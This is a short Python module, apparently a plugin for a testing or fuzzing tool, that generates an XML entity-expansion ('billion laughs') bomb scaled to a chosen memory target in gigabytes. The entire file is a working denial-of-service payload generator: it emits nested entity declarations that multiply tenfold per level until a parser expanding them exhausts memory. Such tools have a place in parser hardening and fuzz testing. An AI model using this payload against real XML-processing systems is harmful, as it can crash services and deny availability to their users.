from options import Options
import math


options = Options()
options.add_option('mem_use', 1.0, 'Target memory use in GB')


def run(generator, output):
    #TODO - whitelist input generator types
    #TODO - check for a valid range of mem_use
    #TODO - floats allowed....
    xml = generate_xml(options['mem_use'])
    output.output(xml)


def generate_xml(target):
    num_places = int(math.floor(math.log(target, 10)))
    power = int(9 + num_places) # 9 for GB
    str_len = math.ceil(target / (10**num_places))
    str_block = "a" * int(str_len)  # TODO - make sure not restricted char from generator?

    ret = []
    ret.append('<?xml version="1.0"?>')
    ret.append('<!DOCTYPE bombz [')
    ret.append('  <!ENTITY bomb "' + str_block + '">')
    ret.append('  <!ELEMENT bombz (#PCDATA)>')
    for i in range(power):
        if i > 0:
            line = ("&bomb" + str(i) + ";")*10
        else:
            line = ("&bomb;") * 10
        ret.append('  <!ENTITY bomb' + str(i+1) + ' "' + line + '">')
    ret.append(']>')
    ret.append('<bombz>&bomb' + str(power) + ';</bombz>')
    return ret